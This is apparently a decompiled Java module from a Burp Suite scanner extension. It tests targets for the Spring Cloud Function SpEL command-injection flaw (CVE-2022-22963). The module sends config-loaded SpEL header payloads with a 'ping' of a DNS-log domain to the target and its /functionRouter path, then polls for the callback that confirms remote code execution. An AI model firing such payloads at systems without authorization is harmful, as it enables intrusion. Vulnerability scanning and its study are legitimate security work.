package burp.payload.RCE;

import burp.BurpExtender;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IHttpService;
import burp.IParameter;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.SpringIssue;
import burp.DnsLog.DnsLogInterface;
import burp.auxiliary.CheckIsSpring;
import burp.auxiliary.YamlReader;
import burp.payload.Payload;
import java.io.FileNotFoundException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Arrays;
import java.util.List;

public class CloudFuncionSpEl implements Payload {
   private BurpExtender burpExtender;
   private IExtensionHelpers helpers;
   private CheckIsSpring checkIsSpring;
   private YamlReader yamlReader;
   private DnsLogInterface dnsLogPlatform;
   private IHttpRequestResponse updataHttp;

   public CloudFuncionSpEl(BurpExtender burpExtender, IExtensionHelpers helpers, CheckIsSpring checkIsSpring) throws FileNotFoundException {
      this.burpExtender = burpExtender;
      this.burpExtender.stdout.println("===========================正在测试是否存在：Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）===========================");
      this.helpers = helpers;
      this.checkIsSpring = checkIsSpring;
      this.yamlReader = new YamlReader(this.burpExtender);
   }

   private byte[] action(IHttpRequestResponse httpRequestResponse, String key, String value) {
      try {
         IRequestInfo requestInfo = this.helpers.analyzeRequest(httpRequestResponse);
         byte[] rawRequest = httpRequestResponse.getRequest();
         List<String> headers = requestInfo.getHeaders();
         headers.add(key + ":" + value);
         headers.set(0, ((String)headers.get(0)).replace("GET", "POST"));
         headers.removeIf((header) -> {
            return header != null && header.toLowerCase().startsWith("content-type:");
         });
         headers.add("Content-type: application/x-www-form-urlencoded");
         rawRequest = (new String(rawRequest)).substring(requestInfo.getBodyOffset()).getBytes();
         IParameter param = this.helpers.buildParameter(this.checkIsSpring.randomStr(6), "1", (byte)1);
         return this.helpers.addParameter(this.helpers.buildHttpMessage(headers, rawRequest), param);
      } catch (Exception var8) {
         var8.printStackTrace();
         this.burpExtender.stderr.println(var8.getMessage());
         return null;
      }
   }

   public IScanIssue doCheckVul(IHttpRequestResponse httpRequestResponse, DnsLogInterface dnsLogPlatform) {
      this.dnsLogPlatform = dnsLogPlatform;
      String dnsLog = this.dnsLogPlatform.getTempDomain();
      boolean is500 = false;
      IHttpService httpService = httpRequestResponse.getHttpService();
      this.helpers.analyzeRequest(httpRequestResponse);
      List payloads = (List)this.yamlReader.getValueByKey("CloudFuncionSpEl.payloads");
      if (this.burpExtender.tags.getSettingUi().isReverseCheck()) {
         String[] payload = ((String)payloads.get(0)).split(":");
         String[] payload2 = ((String)payloads.get(1)).split(":");
         String key = payload[0];
         String value1 = String.format(payload[1], dnsLog);
         String value2 = String.format(payload2[1], "ping " + dnsLog);
         byte[] resp1 = this.action(httpRequestResponse, key, value1);
         byte[] resp2 = this.action(httpRequestResponse, key, value2);
         this.burpExtender.stdout.println("[*] 正在测试payload: " + Arrays.toString(payload) + "\n" + Arrays.toString(payload2));

         try {
            IHttpRequestResponse httpRequestResponse1 = this.burpExtender.callbacks.makeHttpRequest(httpService, resp1);
            IHttpRequestResponse httpRequestResponse2 = this.burpExtender.callbacks.makeHttpRequest(httpService, resp2);
            is500 = this.helpers.analyzeResponse(httpRequestResponse1.getResponse()).getStatusCode() == 500 || this.helpers.analyzeResponse(httpRequestResponse2.getResponse()).getStatusCode() == 500;
            IRequestInfo requestInfo = this.helpers.analyzeRequest(httpRequestResponse2);
            byte[] frRequest = this.helpers.buildHttpRequest(new URL(httpService.getProtocol(), httpService.getHost(), httpService.getPort(), this.checkIsSpring.getUri(requestInfo.getUrl().toString()) + "functionRouter"));
            IHttpRequestResponse frRequestResponse = this.burpExtender.callbacks.makeHttpRequest(httpService, frRequest);
            if (this.helpers.analyzeResponse(frRequestResponse.getResponse()).getStatusCode() != 404) {
               resp1 = this.action(frRequestResponse, key, value1);
               resp2 = this.action(frRequestResponse, key, value2);
               httpRequestResponse1 = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), resp1);
               httpRequestResponse2 = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), resp2);
               requestInfo = this.helpers.analyzeRequest(httpRequestResponse2);
               is500 = this.helpers.analyzeResponse(httpRequestResponse1.getResponse()).getStatusCode() == 500 || this.helpers.analyzeResponse(httpRequestResponse2.getResponse()).getStatusCode() == 500;
            }

            if (is500) {
               this.burpExtender.stdout.println("[*] 回连检测是否存在 Spring Cloud Function SpEL RCE for: " + requestInfo.getUrl().toString() + " ...");

               for(int i = 0; i < 3; ++i) {
                  if (this.dnsLogPlatform.checkResult()) {
                     this.updataHttp = httpRequestResponse2;
                     this.burpExtender.stdout.println("[+] 存在回连！存在漏洞！！！！");
                     this.burpExtender.stdout.println("===========================检测完毕！存在：Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）漏洞 ===========================\n");
                     return new SpringIssue(requestInfo.getUrl(), "Spring Cloud Function SpEL RCE", 0, "High", "Certain", (String)null, (String)null, "(Maybe) URI: '/functionRouter'\nHeaders: '" + key + ":" + value1 + "\n'or'\n" + key + ":" + value2 + "'\nTest dnsllog platform information:\n" + this.dnsLogPlatform.outExport(), (String)null, new IHttpRequestResponse[]{httpRequestResponse2}, httpRequestResponse2.getHttpService());
                  }

                  try {
                     Thread.sleep(10000L);
                  } catch (InterruptedException var21) {
                     this.burpExtender.stderr.println(var21.getMessage());
                  }
               }
            }
         } catch (MalformedURLException var22) {
            var22.printStackTrace();
            this.burpExtender.stderr.println(var22.getMessage());
         } catch (InterruptedException var23) {
            var23.printStackTrace();
         }
      }

      this.burpExtender.stdout.println("===========================检测完毕！不存在：Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）漏洞 ===========================\n");
      return null;
   }

   public IHttpRequestResponse export() {
      return this.updataHttp;
   }
}
